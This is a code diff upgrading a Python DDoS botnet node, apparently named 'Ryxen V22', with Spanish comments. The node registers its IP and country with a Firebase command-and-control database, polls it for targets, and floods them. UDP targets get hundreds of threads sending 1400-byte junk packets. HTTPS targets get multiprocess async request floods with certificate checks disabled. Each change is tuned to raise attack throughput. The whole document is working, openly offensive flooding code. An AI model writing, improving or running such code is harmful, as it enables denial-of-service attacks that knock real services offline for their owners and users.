@@ -1,43 +1,61 @@
-import asyncio, aiohttp, time, random, ssl, socket, threading
+import asyncio, aiohttp, time, random, ssl, socket, threading, multiprocessing, os
 
+# CONFIGURACIÓN RYXEN V22
 DB_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/attack.json"
 NODES_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/nodes"
 
-async def get_node_info():
+def get_node_info_sync():
     try:
-        async with aiohttp.ClientSession() as s:
-            async with s.get('http://ip-api.com/json/', timeout=5) as r:
-                data = await r.json()
-                return data.get('query', '0.0.0.0'), data.get('countryCode', 'UN')
+        import requests
+        r = requests.get('http://ip-api.com/json/', timeout=5).json()
+        return r.get('query', '0.0.0.0'), r.get('countryCode', 'UN')
     except: return "0.0.0.0", "UN"
 
-def udp_engine(target_ip, target_port, end_time):
-    # Payload de 1024 bytes para maximizar el ancho de banda (Gbps)
+# --- MOTOR L4 (UDP/SAMP) - FUERZA BRUTA MULTI-NÚCLEO ---
+def udp_high_speed(target_ip, target_port, end_time):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    packet_data = random._urandom(1024) 
+    # Aumentamos el buffer de envío del sistema operativo
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024)
+    # Payload optimizado para dstats de Gbps (1400 bytes para evitar fragmentación MTU)
+    packet_data = random._urandom(1400) 
+    
     while time.time() < end_time:
         try:
             sock.sendto(packet_data, (target_ip, int(target_port)))
         except: pass
 
-async def l7_engine(target, end_time, sem):
+# --- MOTOR L7 (HTTPS/TLS) - ASYNC EXTREMO ---
+async def extreme_l7(target, end_time, semaphore):
     ctx = ssl.create_default_context()
     ctx.check_hostname, ctx.verify_mode = False, ssl.CERT_NONE
-    # Connector optimizado para miles de conexiones
-    conn = aiohttp.TCPConnector(limit=0, ssl=ctx, ttl_dns_cache=300)
+    ctx.set_ciphers('ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256')
+    
+    conn = aiohttp.TCPConnector(limit=0, ssl=ctx, family=socket.AF_INET, ttl_dns_cache=600)
     async with aiohttp.ClientSession(connector=conn) as session:
         while time.time() < end_time:
-            async with sem:
+            async with semaphore:
                 try:
-                    headers = {'User-Agent': f'Ryxen-V21-{random.randint(1000,9999)}', 'Connection': 'keep-alive'}
+                    headers = {
+                        'User-Agent': f'Ryxen-Extreme-{random.randint(10000,99999)}',
+                        'Accept-Encoding': 'gzip, deflate, br',
+                        'Connection': 'keep-alive'
+                    }
                     async with session.get(target, headers=headers, timeout=1, allow_redirects=False) as r:
                         r.close()
-                except: continue
+                except: await asyncio.sleep(0.0001)
+
+def start_l7_process(target, end_time):
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    sem = asyncio.Semaphore(20000) # Semáforo masivo
+    # 300 tareas asíncronas por cada proceso
+    tasks = [extreme_l7(target, end_time, sem) for _ in range(300)]
+    loop.run_until_complete(asyncio.gather(*tasks))
 
 async def main():
-    ip, cc = await get_node_info()
+    ip, cc = get_node_info_sync()
     nid = f"RX-{cc}-{random.randint(100,999)}"
-    sem = asyncio.Semaphore(15000) # Límite masivo de concurrencia
+    print(f"[*] Ryxen Neural Node {nid} activo. Potenciando hilos...")
     
     async with aiohttp.ClientSession() as session:
         await session.put(f"{NODES_URL}/{nid}.json", json={"id": nid, "ip": ip, "cc": cc, "t": time.time()})
@@ -53,18 +71,21 @@ async def main():
                     if duration <= 0: continue
 
                     end_attack = time.time() + duration
+                    cores = multiprocessing.cpu_count()
+                    
                     if ".udp" in method or ".samp" in method:
                         host, port = target.split(':')
-                        # 200 hilos reales para saturar los 2Gbps de la runner
-                        for _ in range(200):
-                            threading.Thread(target=udp_engine, args=(host, port, end_attack), daemon=True).start()
+                        # Lanzamos 300 hilos distribuidos en todos los cores
+                        for _ in range(300):
+                            threading.Thread(target=udp_high_speed, args=(host, port, end_attack), daemon=True).start()
                     else:
-                        # 200 tareas asíncronas masivas
-                        tasks = [l7_engine(target, end_attack, sem) for _ in range(200)]
-                        asyncio.create_task(asyncio.gather(*tasks))
+                        # Lanzamos procesos independientes para bypassear el GIL de Python
+                        for _ in range(cores):
+                            multiprocessing.Process(target=start_l7_process, args=(target, end_attack), daemon=True).start()
+                            
             except: pass
             await asyncio.sleep(1.5)
 
 if __name__ == "__main__":
     asyncio.run(main())
-                                         
+
